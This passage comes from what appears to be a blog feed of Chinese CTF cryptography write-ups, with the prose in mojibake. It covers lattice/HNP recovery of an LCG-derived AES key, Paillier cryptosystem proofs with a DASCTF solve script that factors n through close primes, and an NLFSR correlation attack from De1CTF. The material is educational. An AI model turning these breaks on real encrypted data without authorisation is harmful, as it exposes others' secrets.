class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_data</span><span class="params">(rand_iter)</span>:</span></span><br><span class="line">    f = open(<span class="string">"old"</span>, <span class="string">"w"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">        f.write(str(rand_iter.next() &gt;&gt; <span class="number">64</span>) + <span class="string">"\n"</span>)</span><br><span class="line">    <span class="keyword">return</span> rand_iter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(rand_iter)</span>:</span></span><br><span class="line">    f = open(<span class="string">"ct"</span>, <span class="string">"wb"</span>)</span><br><span class="line">    key = rand_iter.next() &gt;&gt; <span class="number">64</span></span><br><span class="line">    key = (key &lt;&lt; <span class="number">64</span>) + (rand_iter.next() &gt;&gt; <span class="number">64</span>)</span><br><span class="line">    key = long_to_bytes(key).ljust(<span class="number">16</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    iv = long_to_bytes(rand_iter.next()).ljust(<span class="number">16</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    pt = flag + (<span class="number">16</span> - len(flag) % <span class="number">16</span>) * chr(<span class="number">16</span> - len(flag) % <span class="number">16</span>)</span><br><span class="line">    ct = cipher.encrypt(pt.encode())</span><br><span class="line">    f.write(ct)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(rand_iter)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"ct"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line">    key = rand_iter.next() &gt;&gt; <span class="number">64</span></span><br><span class="line">    key = (key &lt;&lt; <span class="number">64</span>) + (rand_iter.next() &gt;&gt; <span class="number">64</span>)</span><br><span class="line">    key = long_to_bytes(key).ljust(<span class="number">16</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    iv = long_to_bytes(rand_iter.next()).ljust(<span class="number">16</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    ct = cipher.decrypt(flag)</span><br><span class="line">    print(ct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    rand_iter = gen_lcg()</span><br><span class="line">    rand_iter = leak_data(rand_iter)</span><br><span class="line">    decrypt(rand_iter)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>&emsp;&emsp;ä»è¿™ä¸¤é¢˜æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œè§£å†³HNPé—®é¢˜ï¼Œä¸€èˆ¬æˆ‘ä»¬éœ€è¦å¤šç»„æ•°æ®ï¼Œç„¶åæ¯ä¸€ç»„å°±åƒæ–¹ç¨‹ç»„ä¸­çš„æ¯ä¸€æ¡æ–¹ç¨‹ï¼Œæˆ‘ä»¬æ ¹æ®è¿™äº›æ–¹ç¨‹ç»„æ„é€ ä¸€ä¸ªLatticeï¼Œä¹Ÿå¯ä»¥è®¤ä¸ºæ˜¯ä¸€ä¸ªçŸ©é˜µï¼Œå°±å¥½åƒåœ¨ç”¨çŸ©é˜µè§£å†³çº¿ä»£ä¸­çš„ XA=B çš„é—®é¢˜ï¼Œè¿™ä¸ªBä¸­çš„æ¯ä¸€é¡¹æ˜¯æˆ‘ä»¬è·å¾—çš„MSBè¿™æ ·å­çš„æ¯”è¾ƒæ¨¡ç³Šçš„ä¿¡æ¯ï¼ˆä¸Šé¢ä¸¤é¢˜æˆ‘ä»¬æ‹¿åˆ°çš„éƒ½æ˜¯æœªçŸ¥é‡çš„bit_lengthï¼Œä¹Ÿç›¸å½“äºMSBï¼‰ã€‚ç„¶åè¿™ä¸ªBå‘é‡çš„é•¿åº¦ï¼ˆèŒƒå¼ï¼‰éœ€è¦ç›¸å¯¹ä¸æ ¼ä¸­å…¶ä»–å‘é‡è¦çŸ­ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨LLLç®—æ³•æ‰¾åˆ°è¿™ä¸ªBï¼Œè¿›è€Œæ ¹æ®æˆ‘ä»¬çš„æ„é€ ï¼Œç¡®å®šXå‘é‡ä¸­æˆ‘ä»¬éœ€è¦çš„ä¸€ä¸ªç‰¹å®šçš„å€¼ã€‚ä¹Ÿå°±æ˜¯æ–¹ç¨‹ç»„çš„è§£ã€‚</p><p>&emsp;&emsp;éœ€è¦å†æ¬¡è¯´æ˜çš„æ˜¯ï¼Œè¿™ä¸ªçŸ©é˜µæ‰€ä»£è¡¨çš„æ–¹ç¨‹ç»„å¹¶éåƒçœŸæ­£çš„çº¿ä»£ä¸­çš„XA=Bé—®é¢˜ä¸­çš„æ–¹ç¨‹ç»„â€”â€”æ˜¯å¤šå…ƒçš„ã€‚æˆ‘ä»¬è¿™é‡Œçš„æ–¹ç¨‹ç»„æ˜¯ä¸€å…ƒçš„ã€‚å¦‚æœæ­£å¸¸è§£æ–¹ç¨‹çš„è¯ï¼Œä¹‹æ‰€ä»¥è¿™ä¹ˆå¤šæ¡æ–¹ç¨‹éƒ½ç®—ä¸å‡ºè§£ï¼Œå°±æ˜¯å› ä¸ºæˆ‘ä»¬å¾—åˆ°ä¿¡æ¯æ˜¯æ¨¡ç³Šçš„ï¼Œå¹¶éæ˜¯å‡†ç¡®çš„ã€‚æ•…æˆ‘ä»¬éœ€è¦ç”¨åˆ°æ ¼ç†è®ºï¼Œå’Œä¸€ä¸ªè¶…å¥½ç”¨çš„LLLç®—æ³•ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> Lattice </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lattice </tag>
            
            <tag> Dsa </tag>
            
            <tag> LCG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ paillier cryptosystem</title>
      <link href="/2020/05/08/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%20paillier%20cryptosystem/"/>
      <url>/2020/05/08/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%20paillier%20cryptosystem/</url>
      
        <content type="html"><![CDATA[<p>é¦–å‘äº<a href="https://www.anquanke.com/post/id/204720" target="_blank" rel="noopener">å®‰å…¨å®¢</a></p><h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>&emsp;&emsp;ç°ä»£å…¬é’¥å¯†ç ç³»ç»Ÿä¸­ï¼Œå…¶å®è¿œè¿œä¸æ­¢RSAã€DSAã€ECCç­‰ä¼—æ‰€å‘¨çŸ¥çš„å…¬é’¥å¯†ç ç³»ç»Ÿï¼Œæœ€è¿‘è¿˜å­¦ä¹ åˆ°äº†ä¸€ç§æ¯”è¾ƒå¹´è½»çš„å…¬é’¥å¯†ç ç³»ç»Ÿ â€”â€” <strong>paillier cryptosystem</strong> ä½†æ˜¯wikiä¸Šå¹¶æ²¡æœ‰ç»™å‡ºè¯¥æ–¹æ¡ˆçš„è§£å¯†çš„proofã€‚</p><h2 id="Introduce"><a href="#Introduce" class="headerlink" title="Introduce"></a>Introduce</h2><p>&emsp;&emsp;Paillierå¯†ç ï¼Œäº1999å¹´ç”±Pascal Paillierå‘æ˜ï¼Œæ˜¯ä¸€ç§ç”¨äºå…¬é’¥åŠ å¯†çš„æ¦‚ç‡éå¯¹ç§°ç®—æ³•ã€‚è¯¥ç®—æ³•å…·æœ‰åŠ æ³•åŒæ€çš„æ€§è´¨ ; è¿™æ„å‘³ç€ï¼Œä»…ç»™å‡ºå…¬é’¥å’Œm1ã€m2åŠ å¯†ï¼Œå¯ä»¥è®¡ç®—å‡ºm1 + m2</p><h2 id="Key-generation"><a href="#Key-generation" class="headerlink" title="Key generation"></a>Key generation</h2><h3 id="The-frist-patternï¼š"><a href="#The-frist-patternï¼š" class="headerlink" title="The frist patternï¼š"></a>The frist patternï¼š</h3><ol><li>éšæœºé€‰æ‹©ä¸¤ä¸ªå¤§è´¨æ•°pã€qæ»¡è¶³$gcd(pq, (p-1)\cdot (q-1))$ã€‚</li><li>è®¡ç®—$n=p\cdot qï¼ŒÎ» = lcm(p-1, q-1) = \frac{(p-1)\cdot (q-1) }{ gcd(p-1,q-1)}$</li><li>é€‰æ‹©éšæœºæ•´æ•°gï¼Œ$0&lt;g&lt;n^2$</li><li>å®šä¹‰$L(x) = \frac{(x-1)} { n}$</li><li>è®¡ç®—$Î¼ = (L(g^Î» \pmod {n^2} ))^{-1} \pmod n$</li><li>å…¬é’¥ä¸º$(nï¼Œg)$</li><li>ç§é’¥ä¸º$(Î»ï¼ŒÎ¼)$</li></ol><h3 id="The-second-patternï¼ˆa-simpler-variantï¼‰ï¼š"><a href="#The-second-patternï¼ˆa-simpler-variantï¼‰ï¼š" class="headerlink" title="The second patternï¼ˆa simpler variantï¼‰ï¼š"></a>The second patternï¼ˆa simpler variantï¼‰ï¼š</h3><p>å…¶ä½™å‚æ•°ä¸å˜ï¼Œä¸»è¦æ”¹å˜äº†gï¼ŒÎ»ï¼ŒÎ¼çš„å®šä¹‰</p><ol><li>$g = n+1$</li><li>$Î» = Ï†(n) = (p-1)\cdot (q-1) $</li><li>$Î¼ = Ï†(n)^{-1} \pmod n$</li></ol><h2 id="Encryption"><a href="#Encryption" class="headerlink" title="Encryption"></a>Encryption</h2><ol><li>è®¾$m$ä¸ºè¦åŠ å¯†çš„æ¶ˆæ¯ï¼Œæ˜¾ç„¶éœ€è¦æ»¡è¶³ï¼Œ$0 â‰¤ m ï¼œ n$</li><li>é€‰æ‹©éšæœº $r$ï¼Œä¿è¯$gcd(r, n) = 1$</li><li>å¯†æ–‡$c$ï¼š$c = g^m\cdot r^n \pmod {n^2}$</li></ol><h2 id="Decryption"><a href="#Decryption" class="headerlink" title="Decryption"></a>Decryption</h2><ol><li>$m = ( L( c^Î» \pmod {n^2} ) \cdot Î¼ ) \pmod n$</li></ol><h3 id="Proof"><a href="#Proof" class="headerlink" title="Proof"></a>Proof</h3><p>ä»¥ä¸‹æ¨ç†è¿‡ç¨‹å°±ç”¨æ•°å­¦å…¬å¼è®°å½•äº†ï¼Œå¦‚æœå¹³å°æ˜¾ç¤ºä¸å‡ºæ¥çš„è¯ï¼Œå»ºè®®å¤åˆ¶è¿›typoraç­‰æ­¤ç±»ç¼–è¾‘å™¨ä¸­é£Ÿç”¨ï¼Œä¸‹é¢ä¹Ÿä¼šç»™å‡ºæˆªå›¾</p><h4 id="The-first-pattern"><a href="#The-first-pattern" class="headerlink" title="The first pattern"></a>The first pattern</h4><p>ç”± $L(c^Î» \pmod{n^2}\cdot Î¼) \pmod{n}$</p><p>æœ‰ $L(g^{mÎ»}\cdot r^{nÎ»}\pmod{n^2})\cdot Î¼ \pmod{n}$  â‘ </p><p>å…¶ä¸­$Î» = \frac{(p-1) \cdot (q-1)}{gcd((p-1)\cdot (q-1))}, Î¼ = L(g^Î» \pmod{n^2})^{-1} \pmod{n}$</p><p>æ‰€ä»¥â‘ å¼=&gt;  $L(g^{mÎ»}\cdot r^{nÎ»} \pmod{n^2})\cdot L(g^Î» \pmod{n^2})^{-1} \pmod{n}$ â‘¡</p><p>âˆµ$(p-1)|Î», (q-1)|Î»$</p><p>âˆ´$Î» = k_1(p-1) = k_2(q-1)$</p><p>âˆ´$g^Î» = g^{k_1(p-1)}\equiv 1 \pmod{p}ï¼Œå³ (g^Î» -1) | p$</p><p>$ g^Î» = g^{k_2(q-1)}\equiv 1 \pmod{q}ï¼Œ å³ (g^Î» -1) | q$</p><p>âˆ´$  (g^Î» -1) | lcm(p,q) ï¼Œå³ (g^Î» -1) | pqï¼Œå³g^Î» \equiv 1 \pmod{n} $</p><p>âˆ´$g^Î» \pmod{n^2} \equiv 1\pmod{n}$</p><p>âˆ´$g^Î»\pmod{n^2} = k_gn+1; k&lt;n$  </p><p>âˆ´$L(g^Î»\pmod{n^2}) = k_g$</p><p>ä¸”æœ‰</p><ol><li><p>$1+kn \equiv 1+kn \pmod{m^2}$</p></li><li><p>$(1+kn)^2 \equiv 1+2kn+(kn)^2 \equiv 1+2kn \pmod{m^2}$</p></li><li><p>$(1+kn)^3  \equiv 1+3(kn)^2+3kn+(kn)^3 \equiv 1+3kn \pmod{m^2}$</p><p>è¿™é‡Œæˆ‘ä»¬å°±ä¸ç”¨æ•°å­¦åˆ†ææ³•äº†ï¼Œå°±ç›´æ¥æ˜“å¾—äº†</p><p>=&gt; $(1+kn)^{m} \equiv knm+1 \pmod{n^2}$</p></li></ol><p>âˆ´$g^{mÎ»} = (1+k_gn)^{m} \equiv k_gnm+1 \pmod{n^2}$</p><p>âˆ´$r^{nÎ»} = (1+k_nn)^{n} \equiv k_nn^2+1 \equiv 1\pmod{n^2}$</p><p>âˆ´$L(g^{mÎ»}\cdot r^{nÎ»}\pmod{n^2}) = L(k_gnm+1)=mk_g$</p><p>åˆâˆ´$L(g^Î»\pmod{n^2}) = k_g$</p><p>âˆ´â‘¡å¼ï¼š $L(g^{mÎ»} \cdot r^{nÎ»} \pmod{n^2})\cdot L(g^Î» \pmod{n^2})^{-1} \pmod{n}$ =&gt; $mk_g\cdot k_g^{-1} \equiv m \pmod n$</p><p>è¯æ¯•</p><h4 id="The-second-pattern"><a href="#The-second-pattern" class="headerlink" title="The second pattern"></a>The second pattern</h4><p>ç”± $L(c^Î» \pmod{n^2} \cdot Î¼) \pmod{n}$</p><p>æœ‰ $L(g^{mÎ»}\cdot r^{nÎ»} \pmod{n^2} \cdot Î¼) \pmod{n}$  â‘ </p><p>å…¶ä¸­$Î» = (p-1)*(q-1)ï¼Œ Î¼ = Ï†(n)^{-1} \pmod{n}$</p><p>âˆµ$r^{nÎ»} = r^{n(p-1) \cdot (q-1)} = r^{Ï†(n^2)}$</p><p>ç”±æ¬§æ‹‰å®šç†ï¼š$r^{Ï†(n^2)} \equiv 1 \pmod{n^2}$</p><p>â‘ å¼ =&gt; $L(g^{mÎ»} \pmod{n^2} \cdot Î¼) \pmod{n}$  â‘¡</p><p>âˆµ$g = n+1$</p><p>âˆ´$g^{mÎ»} = (1+n)^{mÎ»} \equiv nmÎ»+1 \pmod{n^2}$</p><p>â‘¡å¼=&gt; $L((nmÎ»+1) \cdot Î¼) \pmod{n}$ </p><p>=&gt; $ \frac{(nmÎ»+1)-1}{n} \cdot Î¼ \pmod{n}$ </p><p>=&gt;$(mÎ» \cdot Î¼) \pmod{n}$ â‘¢</p><p>âˆµ$Î» = Ï†(n)ï¼ŒÎ¼ = Ï†(n)^{-1} \pmod{n}$ </p><p>âˆ´â‘¢å¼ï¼š $(mÎ» \cdot Î¼) \equiv m\pmod{n}$</p><p>è¯æ¯•</p><h2 id="DASCTFå››æœˆæœˆèµ›-not-RSA"><a href="#DASCTFå››æœˆæœˆèµ›-not-RSA" class="headerlink" title="DASCTFå››æœˆæœˆèµ› not RSA"></a>DASCTFå››æœˆæœˆèµ› not RSA</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number import getPrime as bytes_to_long</span><br><span class="line"><span class="keyword">from</span><span class="built_in"> secret </span>import flag,p,q</span><br><span class="line"><span class="keyword">from</span> sympy import isprime,nextprime</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line"><span class="attribute">m</span>=bytes_to_long(flag)</span><br><span class="line"><span class="attribute">n</span>=p*q</span><br><span class="line"><span class="attribute">g</span>=n+1</span><br><span class="line"><span class="attribute">r</span>=random.randint(1,n)</span><br><span class="line"></span><br><span class="line">c=(pow(g,m,n*n)*pow(r,n,n*n))%(n*n)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"c=%d"</span>%(c)</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"n=%d"</span>%(n)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸€é¢˜å°±æ˜¯ç”¨çš„paillier cryptosystemï¼Œä¸”å‚æ•°ç”¨çš„æ˜¯ä¸Šæ–‡ä¸­çš„The second pattern</p><p>ä½†æ˜¯æˆ‘ä»¬è®¡ç®—$Î» = Ï†(n) = (p-1)\cdot (q-1)$ ï¼Œéœ€è¦ç”¨åˆ°på’Œq</p><p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥ä¸Šyafuåˆ†è§£nå‘ç°å¯ä»¥æˆåŠŸåˆ†è§£ï¼ŒåŸå› æ˜¯pä¸qå…¶å®éå¸¸æ¥è¿‘ï¼Œæ‰€ä»¥å…¶å®ç›´æ¥å¯¹nå¼€æ ¹ç„¶åå†åœ¨é™„è¿‘å¯»æ‰¾ç´ æ•°å°±èƒ½æ‰¾åˆ°pã€qäº†ã€‚</p><p>æ‰€ä»¥æ„é€ è§£å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,inverse</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">L</span><span class="params">(x,n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (x<span class="number">-1</span>)/n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c=</span><br><span class="line">n=</span><br><span class="line"></span><br><span class="line"><span class="comment">#factor(n)</span></span><br><span class="line">a = iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">p = nextprime(a)</span><br><span class="line">q = n//p</span><br><span class="line"><span class="keyword">assert</span> p*q == n</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ ¹æ®è§£å¯†å…¬å¼ï¼Œè®¡ç®—æ‰€éœ€ç§é’¥å¯¹ï¼ˆÎ»ï¼ŒÎ¼ï¼‰</span></span><br><span class="line">Lambda=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">miu=inverse(Lambda,n*n)</span><br><span class="line">m=(L(pow(c,Lambda,n**<span class="number">2</span>),n)*miu)%n</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><h2 id="Homomorphic-properties"><a href="#Homomorphic-properties" class="headerlink" title="Homomorphic properties"></a>Homomorphic properties</h2><h3 id="Homomorphic-addition-of-plaintexts"><a href="#Homomorphic-addition-of-plaintexts" class="headerlink" title="Homomorphic addition of plaintexts"></a>Homomorphic addition of plaintexts</h3><p>è®¾Dä¸ºè§£å¯†å‡½æ•°ï¼ŒEä¸ºåŠ å¯†å‡½æ•°</p><p>å³ï¼š$D(E(m_1, r_1)\cdot (m_2,r_2) \pmod {n^2}ï¼‰â‰¡ m_1+m_2 \pmod n$</p><h4 id="proof"><a href="#proof" class="headerlink" title="proof"></a>proof</h4><p>$C = (g^{m_1}) \cdot (r_1^n) \cdot (g^{m_2}) \cdot (r_2^n) \pmod {n^2} $</p><p>&emsp;$= g^{m_1+m_2}\cdot (r_1\cdot r_2)^n \pmod {n^2}$</p><p>é¦–å…ˆæˆ‘ä»¬å¯ä»¥å°†$m_1+m_2$çœ‹ä½œä¸€ä¸ªæ•´ä½“$M$ï¼Œç„¶åç”±äº$r_1ã€r_2$æ˜¯éšæœºé€‰çš„ï¼Œæ‰€ä»¥$r_1\cdot r_2$å¯ä»¥çœ‹ä½œä¸€ä¸ªæ•´ä½“$R$</p><p>æ•…$C = g^M \cdot R^n \pmod {n^2}$</p><p>ç”±äº$gcd(r_1,n) = 1; gcd(r_2,n) = 1ï¼› =&gt; gcd(r_1\cdot r_2, n) = 1$ï¼Œæ•…$R$ç¬¦åˆè¦æ±‚</p><p>æ‰€ä»¥$D(C) = M â‰¡ m_1 + m_2 \pmod n$</p><h3 id="Homomorphic-multiplication-of-plaintexts"><a href="#Homomorphic-multiplication-of-plaintexts" class="headerlink" title="Homomorphic multiplication of plaintexts"></a>Homomorphic multiplication of plaintexts</h3><p>è®¾Dä¸ºè§£å¯†å‡½æ•°ï¼ŒEä¸ºåŠ å¯†å‡½æ•°</p><p>å³ï¼š$D(E(m_1, r_1)^k \pmod {n^2})â‰¡ km_1 \pmod n$</p><h4 id="proof-1"><a href="#proof-1" class="headerlink" title="proof"></a>proof</h4><p>$C = (g^{m_1}) \cdot (r_1^n)^k\pmod {n^2} $</p><p>&emsp;$=(g^{km_1}\cdot (r_1^{kn} )\pmod {n^2}$</p><p>é¦–å…ˆæˆ‘ä»¬å¯ä»¥å°†$km_1$çœ‹ä½œä¸€ä¸ªæ•´ä½“$M$ï¼Œç„¶åç”±äº$r_1$æ˜¯éšæœºé€‰çš„ï¼Œæ‰€ä»¥$r_1^k$å¯ä»¥çœ‹ä½œä¸€ä¸ªæ•´ä½“Rï¼Œ</p><p>æ•…$C = g^M \cdot  R^n \pmod {n^2}$</p><p>ç”±äº$gcd(r_1,n) = 1 =&gt; gcd(r_1^k, n) = 1$ï¼Œæ•…$R$ç¬¦åˆè¦æ±‚</p><p>æ‰€ä»¥$D(C) = M â‰¡ km_1 \pmod n$</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://en.wikipedia.org/wiki/Paillier_cryptosystem" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Paillier_cryptosystem</a></p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> Paillier </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Paillier </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 De1CTF</title>
      <link href="/2020/05/05/2020De1CTF/"/>
      <url>/2020/05/05/2020De1CTF/</url>
      
        <content type="html"><![CDATA[<p>é¢˜ç›®å’Œexpå¡<a href="https://github.com/JayxV/JayxV.github.io/blob/master/2020/05/05/2020De1CTF/2020De1CFT.zip" target="_blank" rel="noopener">è¿™é‡Œ</a>äº†ã€‚</p><h3 id="NLFSR"><a href="#NLFSR" class="headerlink" title="NLFSR"></a>NLFSR</h3><p>æ”¹ç¼–è‡ª<a href="https://wiki.x10sec.org/crypto/streamcipher/fsr/nfsr/" target="_blank" rel="noopener">2018å¹´çš„å¼ºç½‘æ¯streamgame3</a>ï¼Œå¼å­å¯ä»¥åŒ–ç®€</p><p>(ao * bo) ^ (bo * co) ^ (bo * do) ^ co ^ do = (ao * bo) ^ (bo * (co ^ do)) ^ (co ^ do)</p><p>[æŠŠco ^ do è®¾ä¸º=&gt;eo ]   =&gt;   (ao * bo) ^ (bo *eo )) ^  eo   è¿™æ ·å­åˆåªæœ‰ä¸‰ä¸ªå¯„å­˜å™¨äº†ã€‚</p><p>ç„¶åæˆ‘ä»¬çœ‹ä¸€ä¸‹å…³ç³»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ao <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> bo <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> eo <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">print</span> ao,bo,eo,(ao*bo)^(bo*eo)^eo</span><br><span class="line">            </span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å­ï¼Œaoã€eo å’Œè¾“å‡ºæœ‰75%ç›¸åŒï¼Œè¿™é‡Œå¯ä»¥ç”¨ç›¸å…³æ”»å‡»ã€‚boçš„è¯ï¼Œçˆ†ç ´å°±å¥½äº†ã€‚</p><p>è¿™é‡Œè¯´è¯´è‡ªå·±å¯¹ç›¸å…³æ”»å‡»çš„ç†è§£ã€‚çº¿æ€§åé¦ˆä½ç§»å¯„å­˜å™¨æ˜¯ç”¨æ¥ç”Ÿæˆå¯†é’¥æµçš„å˜›ï¼Œç„¶åè‰¯å¥½ç”Ÿæˆæ–¹å¼åº”è¯¥æ˜¯è¾“å‡ºçš„æ¯ä¸€ä½ä¸º0å’Œ1çš„æ¦‚ç‡éƒ½åº”è¯¥æ˜¯0.5ï¼Œ<del>è¿™é‡Œçš„lfsråº”è¯¥ä¹Ÿæ˜¯æ¯”è¾ƒè‰¯å¥½çš„å§ï¼Œä¿ºçŒœçš„ï¼Œæœ‰ç°é¢˜äº†ï¼Œå°±æ‡’ç‹—äº†ï¼Œæ²¡æœ‰åšæµ‹è¯•ï¼Œ</del> æ‰€ä»¥æˆ‘ä»¬æ‰æœ‰ä¸Šé¢çš„è¡¨ã€‚</p><p>ç„¶åæˆ‘ä»¬å…ˆçˆ†ç ´aï¼Œå½“aoå’Œè¾“å‡ºï¼ˆä¸ç”¨å…¨éƒ¨è¾“å‡ºå•¦ï¼Œé¢˜ç›®ç»™çš„é‡æœ‰ç‚¹å¤§ï¼Œéšä¾¿æ¥ä¸ª1000ä½å¤§æ¦‚å°±å¥½äº†ï¼‰çš„75%ç›¸åŒæ—¶ï¼Œå¤§æ¦‚å°±ç¡®å®šaäº†ã€‚</p><p>ç„¶åæˆ‘ä»¬åŒæ—¶çˆ†ç ´c,dã€‚å½“co^do å’Œè¾“å‡ºçš„%75ç›¸åŒæ—¶ï¼Œå¤§æ¦‚å°±ç¡®å®šc,däº†ã€‚ï¼ˆå‡ºé¢˜äººæœ‰è‰¯å¿ƒï¼Œc å’Œ d ç»™çš„éƒ½æ¯”è¾ƒçŸ­ï¼‰</p><p>æœ€åæˆ‘ä»¬çˆ†ç ´bï¼ŒæŠŠä¹‹å‰å¾—åˆ°çš„a,c,då¸¦å…¥åˆ°åŠ å¯†ç¨‹åºï¼Œå¦‚æœè¾“å‡ºå’Œé¢˜ç›®ç»™çš„è¾“å‡ºå®Œå…¨ç›¸åŒå°±å¯äº†ã€‚ï¼ˆè¿™æ¬¡ä¹Ÿä¸ç”¨æµ‹å…¨éƒ¨ï¼Œæ¥ä¸ª50ä½ï¼Œ100ä½ä¹Ÿå°±è¶³å¤Ÿäº†ã€‚ï¼‰</p><h3 id="easyRSA"><a href="#easyRSA" class="headerlink" title="easyRSA"></a>easyRSA</h3><p>æ˜¯<a href="https://gist.github.com/LurkNoi/dfe86ed4d16776242251318b380336e7" target="_blank" rel="noopener">2019å¹´D3CTF common</a>ä¸€é¢˜çš„ä¸€ä¸ªpart</p><p>ç›´æ¥ç”¨å½“æ—¶å‡ºé¢˜äººç»™çš„é¢˜è§£expï¼Œ 